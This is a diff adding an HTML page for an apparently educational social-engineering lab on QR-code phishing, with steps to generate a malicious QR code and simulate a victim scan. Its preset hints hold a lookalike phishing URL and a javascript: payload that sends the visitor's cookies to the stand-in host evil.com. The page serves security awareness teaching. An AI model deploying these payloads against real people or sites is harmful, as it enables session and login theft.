@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>QR Code Redirect — Social Engineering Lab</title><link rel="stylesheet" href="style.css"><style>
+  .explain-btn {
+    display: inline-block;
+    position: fixed;
+    top: 12px;
+    right: 16px;
+    background: #161b22;
+    color: #58a6ff;
+    border: 1px solid #30363d;
+    border-radius: 6px;
+    padding: 6px 14px;
+    font-size: .85rem;
+    font-weight: 600;
+    text-decoration: none;
+    z-index: 1000;
+    transition: background .2s, border-color .2s;
+  }
+  .explain-btn:hover { background: #21262d; border-color: #58a6ff; }
+</style>
+</head>
+<body>
+<div class="lab-banner">⚠ EDUCATIONAL LAB — SOCIAL ENGINEERING: QR CODE REDIRECT</div>
+  <a href="explaining.html" class="explain-btn" target="_blank">📖 Explanation</a>
+<div class="container">
+<div class="card main-card">
+  <h2>QR Code Redirect (QRishing)</h2>
+  <p class="subtitle">Social Engineering — Malicious QR Codes</p>
+  <p class="description">QR codes printed in physical locations (menus, flyers, parking meters) can be overlaid with malicious stickers. Victims scan what appears to be a legitimate QR code but are redirected to a phishing page. Unlike URLs, QR codes are not human-readable.</p>
+
+  <div class="step-label">Step 1 — Generate Malicious QR Code</div>
+  <div class="field">
+    <label>Payload URL (attacker controls this)</label>
+    <input type="text" id="payloadUrl" value="https://securecorp.com.evil.com/login">
+  </div>
+  <div class="field">
+    <label>Display Label (what the physical sign says)</label>
+    <input type="text" id="displayLabel" value="Free WiFi — Scan to Connect">
+  </div>
+  <div class="hint-list">
+    <span class="hint" data-url="https://securecorp.com.evil.com/login" data-label="Secure Login Portal">Login phish</span>
+    <span class="hint" data-url="javascript:fetch('https://evil.com/?c='+document.cookie)" data-label="Menu — Scan to Order">Cookie steal</span>
+    <span class="hint" data-url="https://bit.ly/3xAb1Ce" data-label="Scan for Free Parking">URL shortener</span>
+  </div>
+  <button class="btn-primary" id="generateBtn" style="margin-top:12px;width:100%">Generate QR Code</button>
+
+  <div class="step-label">Step 2 — Inspect vs Scan</div>
+  <div class="qr-comparison" id="qrComparison">
+    <div class="qr-col">
+      <div class="qr-label">What the sign says</div>
+      <div id="signLabel" class="sign-label"></div>
+    </div>
+    <div class="qr-col">
+      <div class="qr-label">What the QR encodes</div>
+      <div id="qrCanvas" class="qr-placeholder">QR will appear here</div>
+    </div>
+    <div class="qr-col">
+      <div class="qr-label">Decoded URL</div>
+      <div id="decodedUrl" class="decoded-url"></div>
+    </div>
+  </div>
+
+  <div class="step-label">Step 3 — Simulate Victim Scan</div>
+  <button class="btn-primary" id="scanBtn" style="width:100%">Victim Scans QR Code</button>
+  <div id="victimResult" class="hidden result-msg"></div>
+
+  <div id="explanationBox" class="explanation-box hidden"></div>
+</div>
+</div>
+<script src="script.js"></script>
+</body>
+</html>
